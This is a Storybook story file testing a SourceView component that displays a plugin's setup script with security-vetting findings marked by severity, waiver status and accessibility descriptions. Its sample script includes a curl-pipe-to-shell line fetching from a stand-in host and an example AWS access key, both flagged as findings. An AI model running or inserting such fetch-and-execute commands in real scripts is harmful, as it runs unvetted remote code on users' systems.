import type { Meta, StoryObj } from "@storybook/react-vite";
import { expect, within } from "storybook/test";
import type { FileFinding } from "@/lib/file-findings";
import { SourceView } from "./source-view";

const SCRIPT = [
  "#!/bin/sh",
  "set -e",
  "npm install",
  "curl -fsSL https://x.example/install.sh | sh",
  "echo 'aws_access_key_id=AKIAIOSFODNN7EXAMPLE'",
  "echo 'the setup is finished; a long line follows so the view has to wrap it rather than scroll the page sideways when the reviewer reads it on a narrow screen'",
  "exit 0",
].join("\n");

const finding = (over: Partial<FileFinding>): FileFinding => ({
  vetter: "executable-surface",
  ruleId: "runtime-fetch-exec",
  severity: "high",
  message: "downloads code and pipes it into an interpreter",
  location: "p/setup.sh:4",
  line: 4,
  waived: null,
  ...over,
});

const EVERY_SEVERITY: FileFinding[] = [
  finding({ line: 3, severity: "medium", ruleId: "runtime-dependency", message: "installs packages from a registry at run time" }),
  finding({}),
  finding({
    vetter: "prompt-injection",
    ruleId: "pipe-to-shell",
    message: "the instructions pipe downloaded content straight into a shell",
  }),
  finding({ line: 5, severity: "critical", vetter: "secret-scan", ruleId: "aws-access-key-id", message: "an AWS access key id" }),
  finding({ line: 6, severity: "low", vetter: "license-scan", ruleId: "license-unknown", message: "no known license" }),
  finding({ line: 7, severity: "info", vetter: "secret-scan", ruleId: "file-not-scanned", message: "informational" }),
];

/**
 * A file as numbered lines, each line a finding locates marked by severity with its findings
 * written out beneath it — text, not colour alone, and described to a screen reader.
 *
 * @Requirements GW_APPROVAL_0029
 */
const meta = {
  title: "Snapshots/SourceView",
  component: SourceView,
  decorators: [
    (Story) => (
      <div className="max-w-2xl p-4">
        <Story />
      </div>
    ),
  ],
  args: { path: "plugins/hello/skills/hello/setup.sh", text: SCRIPT, findings: [] },
} satisfies Meta<typeof SourceView>;

export default meta;
type Story = StoryObj<typeof meta>;

/** No findings: numbered text and nothing else. */
export const Plain: Story = {};

/** Every severity, and two findings from two vetters on line 4. */
export const Marked: Story = {
  args: { findings: EVERY_SEVERITY },
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement);
    await expect(canvas.getAllByRole("note")).toHaveLength(6);
    await expect(canvasElement.querySelector('[data-line="4"]')).toHaveAccessibleDescription(
      /pipes it into an interpreter.*straight into a shell/,
    );
  },
};

/** The same in the dark theme. */
export const MarkedDark: Story = { ...Marked, parameters: { theme: "dark" } };

/** A waived finding says who accepted it and until when, and is dimmed rather than hidden. */
export const Waived: Story = {
  args: { findings: [finding({ waived: { by: "alice", until: "2026-10-31T00:00:00Z" } })] },
  play: async ({ canvasElement }) => {
    await expect(within(canvasElement).getByRole("note")).toHaveTextContent(/waived by alice until/);
  },
};

/** A finding past the end of a truncated blob is still shown, with its line. */
export const BeyondTruncation: Story = {
  args: { truncated: true, text: "#!/bin/sh\nset -e", findings: [finding({ line: 40 })] },
  play: async ({ canvasElement }) => {
    await expect(within(canvasElement).getByRole("note")).toHaveTextContent(/line 40 is beyond the part shown/i);
  },
};

/** An addressed line is focused, as a link from the Vetting tab leaves it. */
export const FocusedLine: Story = {
  args: { findings: EVERY_SEVERITY, focusLine: 5 },
  play: async ({ canvasElement }) => {
    await expect(document.activeElement).toBe(canvasElement.querySelector('[data-line="5"]'));
  },
};
